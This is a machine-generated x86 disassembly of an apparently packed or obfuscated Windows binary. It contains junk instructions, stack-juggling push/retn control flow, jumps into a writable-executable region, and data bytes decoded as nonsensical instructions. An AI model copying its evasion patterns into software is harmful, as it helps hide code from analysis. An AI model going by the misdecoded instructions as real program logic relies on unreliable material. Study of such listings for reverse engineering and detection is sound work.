mov [ esp ] ecx
sub dl 0x4f
call sub_4265f4
fdivrp st2
xchg esi eax
bound esp [ esi - 0x9515a56 ]
0x7c211495 0x64fe
cmp [ edx - 0x5611ed6a ] edi
stosb [ edi ]
cvttsd2si esi [ cs : ebx - 0x7028eb6d ]
stosd [ edi ]
push es
mov al [ 0x10773f63 ]
sbb al 0x8c
int3
in al 0x3f
scasd [ edi ]
les ebp [ eax + esi * 4 + 0x540c1b6f ]
jo rwxdata
imul ebp [ edi + 0x6e ] rw-data
pushad
mov [ esp + 0x8 ] 0x8455
push edi
lea esp [ esp + 0x24 ]
call sub_422e71
pushad
mov [ esp + 0x4 ] ah
lea esp [ esp + 0x20 ]
jae rwxdata
pushfd
cmc
test eax eax
pushad
lea esp [ esp + 0x24 ]
jno rwxdata
pushad
call sub_422c89
neg al
call sub_422522
push [ esp + 0x42 ]
popf
pushfd
lea esp [ esp + 0x48 ]
jo rwxdata
xchg bl al
not bl
jmp rwxdata
test sp 0x97a6
bt dx si
xor ecx ecx
call sub_4269eb
pushfd
jmp rwxdata
pushad
lea esp [ esp + 0x20 ]
je rwxdata
jmp rwxdata
inc esi
jmp rwxdata
pushfd
lodsb [ esi ]
call sub_425cd8
sbb esi ecx
mov esi edx
stc
shl dl 0x6
mov edx eax
bt sp bx
cmc
pushfd
stc
xor ebx ebx
mov [ esp ] ah
mov [ esp ] 0x26c95f95
mov [ esp ] bl
shr eax 0x10
add esp 0x4
cmp dh 0xb6
cmp edx 0x92ee9dbc
clc
cmp [ esi ] 0x0
pushad
lea esp [ esp + 0x20 ]
je rwxdata
pushfd
lea esp [ esp + 0x8 ]
jo rwxdata
pushad
mov eax 0x1
pushad
pushfd
pushfd
lea esp [ esp + 0x48 ]
jmp rwxdata
call sub_4269b4
add [ eax ] al
dec eax
popad
jo rwxdata
pushad
mov [ esp ] dh
pushfd
inc esi
pushfd
pushfd
call sub_4250b7
add [ eax ] al
dec eax
je rwxdata
pushfd
mov [ esp ] 0x859e
call sub_422e55
push ebx
call sub_420983
btc bx cx
rcr di 0xf
add ch 0x47
mov ecx [ esi + 0x4 ]
xor di ax
sub ecx 0x8
bt si 0x1
dec edi
rcl bh cl
neg di
shr ecx 0x1
bsr edi edx
sar bx 0xc
ror bl 0x6
mov edi [ esi ]
rcl bl 0x4
adc bl 0x3d
add edi [ ebp - 0x4 ]
shld bx ax 0x1
add esi 0x8
sbb bx 0x7714
test cx 0x4fec
mov bx [ esi ]
pushfd
pushfd
jmp sub_421ff5
jmp rwxdata
je rwxdata
xchg si bx
bswap bx
pop ebx
pushad
mov edi [ esp + 0x20 ]
push [ esp + 0x4 ]
pop esi
mov esi [ esp + 0x24 ]
call sub_425a01
add [ eax ] al
push ebx
je rwxdata
mov ebx 0x42
add [ edi + 0x65 ] al
je rwxdata
inc ecx
insb
insb
outsd
arpl [ eax ] ax
call [ eax ]
ror [ ebp + 0x68082464 ] cl
or ecx [ ebp - 0x61 ]
jo rwxdata
push ecx
lea esp [ esp + 0x4 ]
je rwxdata
call sub_421e6d
and al 0x66
cmp esp esi
jo rwxdata
cmc
cmp ah bl
jmp rwxdata
pushfd
pushfd
test eax 0x80000000
pushfd
pushad
mov [ esp + 0x4 ] 0x5197
mov [ esp ] cx
lea esp [ esp + 0x2c ]
je rwxdata
or [ edi ] cl
test [ esi + edi ] ch
add [ eax ] al
call sub_4208c7
outsb
push edx
jno rwxdata
push 0xd2332ef5
mov [ ebp - 0x8 ] eax
sbb eax esp
aas
clc
mov eax [ esi ]
cmc
test eax eax
push 0x15da7c7
mov [ esp + 0x4 ] 0x40
push [ esp ]
jmp rwxdata
test si 0x53a9
call sub_42526f
test cx 0xce0b
test esi esi
call sub_426c34
pushfd
jmp rwxdata
shr al cl
insd
sar edi cl
[ eax - 0x26 ]
lahf
jae rwxdata
lea esp [ esp + 0xc ]
je rwxdata
and eax 0xffff
mov [ esp ] dx
mov [ esp ] dh
lea esp [ esp + 0x4 ]
jmp rwxdata
call sub_4201d2
push 0x6af9aeda
call j_sub_432345
push edi
add bh bh
xor al 0x24
push esi
pushad
lea esp [ esp + 0x34 ]
ja rwxdata
pushfd
pushfd
xchg [ esp + 0x4 ] eax
pop eax
cwde
push [ ebp - 0x8 ]
setle ah
lea eax [ 0x0 ]
pushad
mov [ esp + 0x1c ] rwxdata
pushfd
jmp rwxdata
rcl si cl
mov esi edi
push 0x86cbe573
sub esi eax
jmp j_sub_422ee4
or bl 0xfc
xchg ebp eax
shld ax bp 0x8
stc
mov eax ebp
shr bl cl
dec bl
pushad
mov bl 0x1
sub esp 0xffffffe0
test si sp
bt ax di
push 0x4c9718b0
xchg [ esp ] esi
cmp sp si
not bl
dec bl
push ebx
push [ esp ]
inc ecx
lea esp [ esp + 0x8 ]
inc bl
inc ecx
mov [ esp + 0x1c ] eax
pushfd
pushad
pushfd
pushfd
push [ esp + 0x48 ]
retn 0x4c
sub_421ff5
test dh 0x40
cmp al 0x1c
das
jno rwxdata
je rwxdata
mov edi [ esp + 0x20 ]
xchg si bp
push [ esp + 0xc ]
xchg si bp
call sub_422942
add [ eax ] al
inc edi
je rwxdata
fcomp [ ebx + 0x60 ]
clc
out dx eax
xchg ebp eax
aad 0x2f
push ebp
xchg ebp eax
or ebp [ ebx ]
add al 0xe
inc esi
cmp [ eax ] bl
sbb ch [ 0xffffffffef455118 ]
daa
xor ecx [ ebx + eax * 8 - 0x29 ]
mov eax 0xd81aebce
jb rwxdata
test al 0x88
jmp 0x69705301
jne rwxdata
rcl edx 0xa8
mov cl ch
bound esi [ edx ]
imul ebp [ cs : ecx + 0x2 ] 0xb1c5dd8a
xchg ebp eax
0x1680
dec ecx
outsb
outsw
inc ecx
add cl ch
sbb eax 0x6800003c
fsubr [ esi - 0x2f177407 ]
push cs
add [ eax ] eax
jmp rwxdata
shr ebx 0xc
pushfd
call sub_426c9a
movsx bx al
pop ebx
pushad
adc eax 0x40c6f6cb
sub_4220da
lea esp [ esp + 0x4c ]
je rwxdata
inc ah
mov esi edi
clc
add esi ebx
pushfd
pushad
push edi
lea esp [ esp + 0x28 ]
jmp rwxdata
push edi
xchg [ esp ] eax
push esi
lea eax [ 0x0 ]
lea esp [ esp + 0x4 ]
jb rwxdata
rcr al cl
das
lea eax [ edi + 0x3cef715b ]
rcl ax 0xd
mov eax [ edx + 0xc ]
cmp sp si
add eax ebx
jmp rwxdata
pushfd
mov [ esp ] rwxdata
pushad
pushad
mov [ esp ] edi
mov [ esp + 0x3c ] eax
pushfd
push edx
push [ esp + 0x44 ]
retn 0x48
pushad
mov [ esp + 0x4 ] 0x3bc1
mov [ esp + 0x1c ] rwxdata
pushfd
mov [ esp + 0x1c ] eax
pushfd
push [ esp + 0x20 ]
retn 0x24
sub_4220f3
add [ edi + ebx ] edx
sub esp 0xfffffff8
test al 0x49
fbstp [ edx - 0xc9bbfa0 ]
sub eax 0x224de115
jb rwxdata
xchg edx eax
pop ecx
sub cl [ ecx - 0x16 ]
imul edi [ edx + 0x24648d3d ] 0xb2840f28
inc esp
add [ eax ] al
pushad
mov [ edi ] eax
call sub_425424
dec ebp
and dl cl
add bh cl
je rwxdata
shr [ eax ] 0x74
mov eax [ 0x5e2e4124 ]
mov dl 0xa5
0x9682
jo rwxdata
rol [ edx ] 0x1
stc
sub eax 0x224de115
outsb
push edi
add [ ebp + 0x2474ffc0 ] al
or al 0x8d
and al 0x40
je rwxdata
and esi 0xbda0ca2b
btc edi ebx
bt di 0xc
xor eax eax
sbb dx 0x556
lea ebx [ esi * 2 - 0x2493fa55 ]
jmp rwxdata
mov [ ecx ] 0xdf
outsb
push 0x6c646e61
inc ebp
js rwxdata
mov ebx eax
adc dx di
mov edx [ ebx + 0x3c ]
call sub_425a4e
add [ eax ] al
inc edi
je rwxdata
and al 0x8d
and al 0x24
call sub_422e71
pushad
call sub_42250b
btc si cx
jo rwxdata
or [ eax ] al

imul ebp [ ebp + 0x65 ] 0x656e6f5a
dec ecx
outsb
outsw
jb rwxdata
cmp bl [ esi - 0x26 ]
out dx al
cmp cl [ esi + 0xa ]
push es
xor [ eax + 0x10773f63 ] esp
jb rwxdata
mov esi edi
test edi 0x5702cfeb
bt edx edx
sub esi eax
call sub_42698c
add [ eax ] al
inc edi
je rwxdata
imul ebp [ edi + 0x6e ] 0x746c6946
jb rwxdata
daa
popad
je rwxdata
cmp [ edx - 0x5611ed6a ] edi
stosb [ edi ]
cvttsd2si esi [ cs : ebx - 0x7028eb6d ]
stosd [ edi ]
push es
mov al [ 0x10773f63 ]
sbb al 0x8c
int3
in al 0x3f
scasd [ edi ]
les ebp [ eax + esi * 4 + 0x540c1b6f ]
jo rwxdata
imul ebp [ edi + 0x6e ] rw-data
pushfd
cmc
test eax eax
pushad
lea esp [ esp + 0x24 ]
jno rwxdata
dec ecx
rol [ edi ] 0x1
les esp [ edi ]
outsd
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
xchg bl al
not bl
jmp rwxdata
test sp 0x97a6
bt dx si
xor ecx ecx
call sub_4269eb
pushfd
jmp rwxdata
pushad
lea esp [ esp + 0x20 ]
je rwxdata
push ds
add [ eax ] al
add [ eax ] al
dec ebp
jne rwxdata
je rwxdata
xchg edx edx
push ecx
fsubp st1
push edx
adc dh 0x86
pushfd
ficomp [ edx ]
inc esi
mov cl [ esi + 0xa2192e1 ]
jno sub_4201cb
add [ ebx + 0x51 ] ebp
shr [ esi - 0x2fd83b5c ] 0x1
pop es
jb rwxdata
pushfd
lodsb [ esi ]
call sub_425cd8
sbb esi ecx
mov esi edx
stc
shl dl 0x6
mov edx eax
bt sp bx
cmc
pushfd
stc
xor ebx ebx
mov [ esp ] ah
mov [ esp ] 0x26c95f95
mov [ esp ] bl
shr eax 0x10
add esp 0x4
cmp dh 0xb6
cmp edx 0x92ee9dbc
clc
cmp [ esi ] 0x0
pushad
lea esp [ esp + 0x20 ]
je rwxdata
pushfd
lea esp [ esp + 0x8 ]
jo rwxdata
pushad
mov eax 0x1
pushad
pushfd
pushfd
lea esp [ esp + 0x48 ]
jmp rwxdata
call sub_4269b4
add [ eax ] al
dec eax
popad
jo rwxdata
mov ebp 0x9bebf399
mov ch 0x8f
aaa
push esp
jg rwxdata
je rwxdata
push esi
arpl [ eax + eax + 0x4b ] si
inc ebp
push edx
dec esi
inc ebp
dec esp
xor esi [ edx ]
insb
insb
add [ eax ] al
add [ ebx + 0x65 ] dl
je rwxdata
mov dl 0x21
xor ch cl
add cl 0xdf
add [ eax ] al
push esi
imul esi [ edx + 0x74 ] 0x506c6175
jb rwxdata
imul ebp [ edi + 0x6e ] 0xe9c08500
in al dx
pop ebp
add [ eax ] al
pushad
pushfd
push [ esp + 0x2c ]
retn 0x30
push ebx
call sub_420983
btc bx cx
rcr di 0xf
add ch 0x47
mov ecx [ esi + 0x4 ]
xor di ax
sub ecx 0x8
bt si 0x1
dec edi
rcl bh cl
neg di
shr ecx 0x1
bsr edi edx
sar bx 0xc
ror bl 0x6
mov edi [ esi ]
rcl bl 0x4
adc bl 0x3d
add edi [ ebp - 0x4 ]
shld bx ax 0x1
add esi 0x8
sbb bx 0x7714
test cx 0x4fec
mov bx [ esi ]
pushfd
pushfd
jmp sub_421ff5
jmp rwxdata
je rwxdata
xchg si bx
bswap bx
pop ebx
pushad
mov edi [ esp + 0x20 ]
push [ esp + 0x4 ]
pop esi
mov esi [ esp + 0x24 ]
call sub_425a01
add [ eax ] al
push ebx
je rwxdata
mov ebx 0x42
add [ edi + 0x65 ] al
je rwxdata
inc ecx
insb
insb
outsd
arpl [ eax ] ax
popad
hlt
loope rwxdata
inc edx
jns rwxdata
stc
stc
add esi 0x2
pushad
mov [ esp + 0x4 ] si
mov [ esp ] al
dec ecx
push [ esp ]
call sub_420015
add [ eax ] al
dec ecx
outsb
je rwxdata
jmp rwxdata
and al 0x24
je rwxdata
push ecx
lea esp [ esp + 0x4 ]
je rwxdata
call sub_421e6d
or si dx
bsr si bx
mov esi [ edx ]
cmc
pushad
call sub_422fd4
movzx esi bl
clc
rol si cl
add edi ebx
ja rwxdata
imul ebp [ ecx + 0x62 ] 0x5400656c
cwde
push edi
pushfd
les eax [ eax ]
jg rwxdata
bound ebp [ ebp ]
cdq
jmp rwxdata
push 0x48
cmp al 0x16
push esp
outsd
push edi
imul esp [ ebp + 0x43 ] 0x726168
add [ eax ] al
dec ecx
outsb
dec eax
popad
outsb
insb
add [ gs : ebp + 0xf082464 ] cl
test [ ebx - 0x63ffffd5 ] ebp
pushfd
push 0xd81db81
push edx
stosb [ edi ]
push 0x7e77faba
push esp
pushfd
lea esp [ esp + 0x1c ]
jmp rwxdata
cmc
cmp ah bl
jmp rwxdata
pushfd
add [ ebp - 0x4 ] 0x14
pushfd
pushad
lea esp [ esp + 0x28 ]
jmp rwxdata
pushfd
pushfd
test eax 0x80000000
pushfd
pushad
mov [ esp + 0x4 ] 0x5197
mov [ esp ] cx
lea esp [ esp + 0x2c ]
je rwxdata
call 0xffffffffd2e8aedd
imul [ eax ]
mov al [ 0xffffffffb2305032 ]
shl [ ebp - 0xa75796e ] 0x1
cmp [ ebp - 0x1e715a9e ] bh
mov cl 0xb1
and dh [ edi ]
test bl ch
xchg ecx eax
rcr [ ebp + 0x4d294d59 ] 0xb9
iretd
je rwxdata
inc ebx
push 0x7261
add [ ecx + 0x6e ] cl
adc eax 0x6db14d21
inc esp
add edi [ edi + 0x2b775f7b ]
dec esi
mov cl 0x54
cli
loop rwxdata
push ss
jb rwxdata
jmp rwxdata
push 0xd2332ef5
mov [ ebp - 0x8 ] eax
sbb eax esp
aas
clc
mov eax [ esi ]
cmc
test eax eax
push 0x15da7c7
mov [ esp + 0x4 ] 0x40
push [ esp ]
jmp rwxdata
sub di si
sbb dl al
mov edx [ ebp - 0x4 ]
sar di 0xa
dec di
movsx di cl
sbb di 0xa30b
mov edi [ edx + 0x10 ]
pushfd
jmp rwxdata
test si 0x53a9
call sub_42526f
test cx 0xce0b
test esi esi
call sub_426c34
pushfd
jmp rwxdata
fisubr [ ecx + 0x2 ]
add al [ eax ]
ja rwxdata
xchg esp eax
std
xchg ebp eax
sub cl 0xda
mov eax [ 0xffffffff919a99b2 ]
dec ecx
or dl [ esi + 0x252f9 ]
xor eax 0x5200022f
and eax [ edx ]
add [ eax + 0x67 ] bh
add al [ eax ]
inc ecx
and [ edx ] eax
add [ edi + 0x6d000202 ] bh
sub al [ edx ]
add [ edx ] ah
add [ edx ] eax
add [ eax + 0x3b000202 ] ah
add al [ eax ]
dec eax
das
add al [ eax ]
sbb edx [ edx + 0x2 ]
add [ edx ] bl
and [ edx ] al
add [ ecx ] cl
add al [ eax ]
jpe __import_lookup_table_0(KERNEL32:GetStringTypeA)
pop edi
adc eax 0x5f58de6e
call 0xffffffffd2e8aedd
push eax
je rwxdata
jno rwxdata
pop edi
je rwxdata
pushad
mov [ esp + 0x8 ] 0x8455
push edi
lea esp [ esp + 0x24 ]
call sub_422e71
pushad
mov [ esp + 0x4 ] ah
lea esp [ esp + 0x20 ]
jae rwxdata
lea esp [ esp + 0xc ]
je rwxdata
bt di dx
bt sp 0xf
test edi edi
pushfd
jmp rwxdata
and eax 0xffff
mov [ esp ] dx
mov [ esp ] dh
lea esp [ esp + 0x4 ]
jmp rwxdata
add al [ eax ]
mov esi 0x13000201
push esp
add al [ eax ]
out dx eax
and al [ edx ]
add [ 0x7900026a ] dl
pop ebp
add al [ eax ]
retn 0x225
add al [ eax ]
and ebp [ edi ]
add [ ecx - 0x6efffdd1 ] dl
add al [ edx ]
add [ edi ] dh
add al [ es : eax ]
pop edx
pop ebp
add al [ eax ]
pop edi
sub al 0x2
add dh al
pop ebx
add al [ eax ]
mov eax [ 0x3f000201 ]
pop eax
add al [ eax ]
and al 0x5a
add al [ eax ]
and [ ebp + 0x2 ] dl
add cl al
add eax 0x2f230002
add al [ eax ]
movsb [ edi ] [ esi ]
pop edi
add al [ eax ]
scasb [ edi ]
push esp
add al [ eax ]
add eax [ esi ]
add al [ eax ]
sub edx [ ecx + 0x2 ]
add [ ebx + 0x23 ] bh
add al [ eax ]
test eax 0xa000250
xor [ edx ] al
add [ edi + 0x2 ] bl
add al [ eax ]
and [ 0x69da0002 ] 0x2
mov ecx 0xc2710a65
loope rwxdata
insd
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
pushad
lea esp [ esp + 0x24 ]
xor edx eax
jne rwxdata
lea esp [ esp + 0x8 ]
je rwxdata
pushfd
pushfd
xchg [ esp + 0x4 ] eax
pop eax
cwde
push [ ebp - 0x8 ]
setle ah
lea eax [ 0x0 ]
pushad
mov [ esp + 0x1c ] rwxdata
pushfd
jmp rwxdata
push esp
popad
jae rwxdata
and [ edx + 0x25 ] ah
scasb [ edi ]
dec ebx
leave
xor ebx [ eax ]
test al 0x49
pop es
and ecx 0xf399bde1
jmp rwxdata
jb rwxdata
mov [ esp + 0x1c ] eax
pushfd
pushad
pushfd
pushfd
push [ esp + 0x48 ]
retn 0x4c
std
inc ebp
jb rwxdata
push 0x61
sbb eax [ ebx + 0x2aca3db5 ]
imul [ ebp - 0x6b0ac89a ]
fdiv [ bx + si + 0x22 ]
jno rwxdata
bound esp [ ebp - 0x4e4e1e72 ]
inc esp
popad
je rwxdata
pop edx
xchg esp eax
jne rwxdata
outsd
jb rwxdata
mov edi 0x2b775f7b
inc ecx
jbe rwxdata
cmc
add [ edi + ebx ] ax
sub_4222a4
mov [ esp ] 0x7b
lea esp [ esp + 0x4 ]
je rwxdata
and esi 0xbda0ca2b
btc edi ebx
bt di 0xc
xor eax eax
sar esi cl
sbb si sp
btc si bx
adc si 0x475b
add edi ebx
xor si ax
adc esi ecx
pushad
rcl si cl
mov esi [ edx ]
pushfd
push [ esp + 0x4 ]
stc
test esi esi
mov [ esp ] dl
lea esp [ esp + 0x28 ]
je rwxdata
mov [ ecx ] 0xdf
outsb
push 0x6c646e61
inc ebp
js rwxdata
inc ah
mov esi edi
jmp rwxdata
and al 0x8d
and al 0x24
call sub_422e71
pushad
call sub_42250b
btc si cx
jo rwxdata
push edi
xchg [ esp ] eax
push esi
lea eax [ 0x0 ]
lea esp [ esp + 0x4 ]
jb rwxdata
add esi ebx
pushad
mov [ esp ] 0x66
pushad
lea esp [ esp + 0x40 ]
jmp rwxdata
cmp bl [ esi - 0x26 ]
out dx al
cmp cl [ esi + 0xa ]
push es
xor [ eax + 0x10773f63 ] esp
jb rwxdata
mov esi edi
test edi 0x5702cfeb
bt edx edx
sub esi eax
call sub_42698c
add [ eax ] al
inc edi
je rwxdata
imul ebp [ edi + 0x6e ] 0x746c6946
jb rwxdata
pushfd
mov [ esp ] rwxdata
pushad
pushad
mov [ esp ] edi
mov [ esp + 0x3c ] eax
pushfd
push edx
push [ esp + 0x44 ]
retn 0x48
pushad
mov [ esp + 0x4 ] 0x3bc1
mov [ esp + 0x1c ] rwxdata
pushfd
mov [ esp + 0x1c ] eax
pushfd
push [ esp + 0x20 ]
retn 0x24
rcr al cl
das
lea eax [ edi + 0x3cef715b ]
rcl ax 0xd
mov eax [ edx + 0xc ]
cmp sp si
add eax ebx
jmp rwxdata
cmp [ edx - 0x5611ed6a ] edi
stosb [ edi ]
cvttsd2si esi [ cs : ebx - 0x7028eb6d ]
stosd [ edi ]
push es
mov al [ 0x10773f63 ]
sbb al 0x8c
int3
in al 0x3f
scasd [ edi ]
les ebp [ eax + esi * 4 + 0x540c1b6f ]
jo rwxdata
imul ebp [ edi + 0x6e ] rw-data
pushad
mov [ esp + 0x8 ] 0x8455
push edi
lea esp [ esp + 0x24 ]
call sub_422e71
pushad
mov [ esp + 0x4 ] ah
lea esp [ esp + 0x20 ]
jae rwxdata
pushfd
cmc
test eax eax
pushad
lea esp [ esp + 0x24 ]
jno rwxdata
xchg bl al
not bl
jmp rwxdata
test sp 0x97a6
bt dx si
xor ecx ecx
call sub_4269eb
pushfd
jmp rwxdata
pushad
lea esp [ esp + 0x20 ]
je rwxdata
pushfd
lodsb [ esi ]
call sub_425cd8
sbb esi ecx
mov esi edx
stc
shl dl 0x6
mov edx eax
bt sp bx
cmc
pushfd
stc
xor ebx ebx
mov [ esp ] ah
mov [ esp ] 0x26c95f95
mov [ esp ] bl
shr eax 0x10
add esp 0x4
cmp dh 0xb6
cmp edx 0x92ee9dbc
clc
cmp [ esi ] 0x0
pushad
lea esp [ esp + 0x20 ]
je rwxdata
pushfd
lea esp [ esp + 0x8 ]
jo rwxdata
pushad
mov eax 0x1
pushad
pushfd
pushfd
lea esp [ esp + 0x48 ]
jmp rwxdata
call sub_4269b4
add [ eax ] al
dec eax
popad
jo rwxdata
push ebx
call sub_420983
btc bx cx
rcr di 0xf
add ch 0x47
mov ecx [ esi + 0x4 ]
xor di ax
sub ecx 0x8
bt si 0x1
dec edi
rcl bh cl
neg di
shr ecx 0x1
bsr edi edx
sar bx 0xc
ror bl 0x6
mov edi [ esi ]
rcl bl 0x4
adc bl 0x3d
add edi [ ebp - 0x4 ]
shld bx ax 0x1
add esi 0x8
sbb bx 0x7714
test cx 0x4fec
mov bx [ esi ]
pushfd
pushfd
jmp sub_421ff5
jmp rwxdata
je rwxdata
xchg si bx
bswap bx
pop ebx
pushad
mov edi [ esp + 0x20 ]
push [ esp + 0x4 ]
pop esi
mov esi [ esp + 0x24 ]
call sub_425a01
add [ eax ] al
push ebx
je rwxdata
mov ebx 0x42
add [ edi + 0x65 ] al
je rwxdata
inc ecx
insb
insb
outsd
arpl [ eax ] ax
push ecx
lea esp [ esp + 0x4 ]
je rwxdata
call sub_421e6d
or si dx
bsr si bx
mov esi [ edx ]
cmc
pushad
call sub_422fd4
movzx esi bl
clc
rol si cl
add edi ebx
cmc
cmp ah bl
jmp rwxdata
pushfd
add [ ebp - 0x4 ] 0x14
pushfd
pushad
lea esp [ esp + 0x28 ]
jmp rwxdata
pushfd
pushfd
test eax 0x80000000
pushfd
pushad
mov [ esp + 0x4 ] 0x5197
mov [ esp ] cx
lea esp [ esp + 0x2c ]
je rwxdata
push 0xd2332ef5
mov [ ebp - 0x8 ] eax
sbb eax esp
aas
clc
mov eax [ esi ]
cmc
test eax eax
push 0x15da7c7
mov [ esp + 0x4 ] 0x40
push [ esp ]
jmp rwxdata
sub di si
sbb dl al
mov edx [ ebp - 0x4 ]
sar di 0xa
dec di
movsx di cl
sbb di 0xa30b
mov edi [ edx + 0x10 ]
pushfd
jmp rwxdata
test si 0x53a9
call sub_42526f
test cx 0xce0b
test esi esi
call sub_426c34
pushfd
jmp rwxdata
lea esp [ esp + 0xc ]
je rwxdata
bt di dx
bt sp 0xf
test edi edi
pushfd
jmp rwxdata
and eax 0xffff
mov [ esp ] dx
mov [ esp ] dh
lea esp [ esp + 0x4 ]
jmp rwxdata
lea esp [ esp + 0x8 ]
je rwxdata
pushfd
pushfd
xchg [ esp + 0x4 ] eax
pop eax
cwde
push [ ebp - 0x8 ]
setle ah
lea eax [ 0x0 ]
pushad
mov [ esp + 0x1c ] rwxdata
pushfd
jmp rwxdata
mov [ esp + 0x1c ] eax
pushfd
pushad
pushfd
pushfd
push [ esp + 0x48 ]
retn 0x4c
sub_4222e7
mov edi [ edx + 0x10 ]
jmp rwxdata
test cx ax
cmc
stc
test edi edi
pushad
lea esp [ esp + 0x28 ]
je rwxdata
and esi 0xbda0ca2b
btc edi ebx
bt di 0xc
xor eax eax
bswap si
shrd si ax cl
add edi ebx
dec si
cmp dh 0x6a
rol esi cl
mov esi [ edx ]
bt bp sp
jmp rwxdata
mov [ ecx ] 0xdf
outsb
push 0x6c646e61
inc ebp
js rwxdata
test cx 0xce0b
test esi esi
call sub_426c34
and al 0x8d
and al 0x24
call sub_422e71
pushad
call sub_42250b
btc si cx
jo rwxdata
cmp bl [ esi - 0x26 ]
out dx al
cmp cl [ esi + 0xa ]
push es
xor [ eax + 0x10773f63 ] esp
jb rwxdata
mov esi edi
test edi 0x5702cfeb
bt edx edx
sub esi eax
call sub_42698c
add [ eax ] al
inc edi
je rwxdata
imul ebp [ edi + 0x6e ] 0x746c6946
jb rwxdata
cmp [ edx - 0x5611ed6a ] edi
stosb [ edi ]
cvttsd2si esi [ cs : ebx - 0x7028eb6d ]
stosd [ edi ]
push es
mov al [ 0x10773f63 ]
sbb al 0x8c
int3
in al 0x3f
scasd [ edi ]
les ebp [ eax + esi * 4 + 0x540c1b6f ]
jo rwxdata
imul ebp [ edi + 0x6e ] rw-data
pushad
mov [ esp + 0x8 ] 0x8455
push edi
lea esp [ esp + 0x24 ]
call sub_422e71
pushad
mov [ esp + 0x4 ] ah
lea esp [ esp + 0x20 ]
jae rwxdata
pushfd
cmc
test eax eax
pushad
lea esp [ esp + 0x24 ]
jno rwxdata
xchg bl al
not bl
jmp rwxdata
test sp 0x97a6
bt dx si
xor ecx ecx
call sub_4269eb
pushfd
jmp rwxdata
pushad
lea esp [ esp + 0x20 ]
je rwxdata
pushfd
lodsb [ esi ]
call sub_425cd8
sbb esi ecx
mov esi edx
stc
shl dl 0x6
mov edx eax
bt sp bx
cmc
pushfd
stc
xor ebx ebx
mov [ esp ] ah
mov [ esp ] 0x26c95f95
mov [ esp ] bl
shr eax 0x10
add esp 0x4
cmp dh 0xb6
cmp edx 0x92ee9dbc
clc
cmp [ esi ] 0x0
pushad
lea esp [ esp + 0x20 ]
je rwxdata
pushfd
lea esp [ esp + 0x8 ]
jo rwxdata
pushad
mov eax 0x1
pushad
pushfd
pushfd
lea esp [ esp + 0x48 ]
jmp rwxdata
call sub_4269b4
add [ eax ] al
dec eax
popad
jo rwxdata
push ebx
call sub_420983
btc bx cx
rcr di 0xf
add ch 0x47
mov ecx [ esi + 0x4 ]
xor di ax
sub ecx 0x8
bt si 0x1
dec edi
rcl bh cl
neg di
shr ecx 0x1
bsr edi edx
sar bx 0xc
ror bl 0x6
mov edi [ esi ]
rcl bl 0x4
adc bl 0x3d
add edi [ ebp - 0x4 ]
shld bx ax 0x1
add esi 0x8
sbb bx 0x7714
test cx 0x4fec
mov bx [ esi ]
pushfd
pushfd
jmp sub_421ff5
jmp rwxdata
je rwxdata
xchg si bx
bswap bx
pop ebx
pushad
mov edi [ esp + 0x20 ]
push [ esp + 0x4 ]
pop esi
mov esi [ esp + 0x24 ]
call sub_425a01
add [ eax ] al
push ebx
je rwxdata
mov ebx 0x42
add [ edi + 0x65 ] al
je rwxdata
inc ecx
insb
insb
outsd
arpl [ eax ] ax
push ecx
lea esp [ esp + 0x4 ]
je rwxdata
call sub_421e6d
or si dx
bsr si bx
mov esi [ edx ]
cmc
pushad
call sub_422fd4
movzx esi bl
clc
rol si cl
add edi ebx
cmc
cmp ah bl
jmp rwxdata
pushfd
add [ ebp - 0x4 ] 0x14
pushfd
pushad
lea esp [ esp + 0x28 ]
jmp rwxdata
pushfd
pushfd
test eax 0x80000000
pushfd
pushad
mov [ esp + 0x4 ] 0x5197
mov [ esp ] cx
lea esp [ esp + 0x2c ]
je rwxdata
push 0xd2332ef5
mov [ ebp - 0x8 ] eax
sbb eax esp
aas
clc
mov eax [ esi ]
cmc
test eax eax
push 0x15da7c7
mov [ esp + 0x4 ] 0x40
push [ esp ]
jmp rwxdata
sub di si
sbb dl al
mov edx [ ebp - 0x4 ]
sar di 0xa
dec di
movsx di cl
sbb di 0xa30b
mov edi [ edx + 0x10 ]
pushfd
jmp rwxdata
test si 0x53a9
call sub_42526f
pushfd
jmp rwxdata
lea esp [ esp + 0xc ]
je rwxdata
bt di dx
bt sp 0xf
test edi edi
pushfd
jmp rwxdata
and eax 0xffff
mov [ esp ] dx
mov [ esp ] dh
lea esp [ esp + 0x4 ]
jmp rwxdata
lea esp [ esp + 0x8 ]
je rwxdata
pushfd
pushfd
xchg [ esp + 0x4 ] eax
pop eax
cwde
push [ ebp - 0x8 ]
setle ah
lea eax [ 0x0 ]
pushad
mov [ esp + 0x1c ] rwxdata
pushfd
jmp rwxdata
mov [ esp + 0x1c ] eax
pushfd
pushad
pushfd
pushfd
push [ esp + 0x48 ]
retn 0x4c
sub_4223a7
mov dl [ esi ]
bt ecx 0x19
jmp rwxdata
push 0x983cd9a2
cmc
ror dl 0x1
push [ esp ]
push [ esp ]
stc
add dl 0x2e
pushad
clc
bt di 0xe
clc
neg dl
mov [ esp + 0x8 ] esi
pushfd
stc
mov [ esp ] ecx
sub dl 0x4f
call sub_4265f4
fdivrp st2
xchg esi eax
bound esp [ esi - 0x9515a56 ]
0x7c211495 0x64fe
sub_42242b
shl eax 0x8
pushfd
setl al
lodsb [ esi ]
mov [ esp ] 0x1c135414
mov [ esp ] bx
ror al 0x1
pushfd
test dl 0xe3
pushfd
add al 0x2e
stc
mov [ esp + 0x4 ] dx
add esp 0x3c
jae rwxdata
pushad
call sub_422c89
neg al
call sub_422522
push [ esp + 0x42 ]
popf
pushfd
lea esp [ esp + 0x48 ]
jo rwxdata
jmp rwxdata
inc esi
jmp rwxdata
pushad
mov [ esp ] dh
pushfd
inc esi
pushfd
pushfd
call sub_4250b7
add [ eax ] al
dec eax
je rwxdata
pushfd
mov [ esp ] 0x859e
call sub_422e55
call [ eax ]
ror [ ebp + 0x68082464 ] cl
or ecx [ ebp - 0x61 ]
jo rwxdata
and al 0x66
cmp esp esi
jo rwxdata
or [ edi ] cl
test [ esi + edi ] ch
add [ eax ] al
call sub_4208c7
outsb
push edx
jno rwxdata
shr al cl
insd
sar edi cl
[ eax - 0x26 ]
lahf
jae rwxdata
call sub_4201d2
push 0x6af9aeda
call j_sub_432345
push edi
add bh bh
xor al 0x24
push esi
pushad
lea esp [ esp + 0x34 ]
ja rwxdata
rcl si cl
mov esi edi
push 0x86cbe573
sub esi eax
jmp j_sub_422ee4
or bl 0xfc
xchg ebp eax
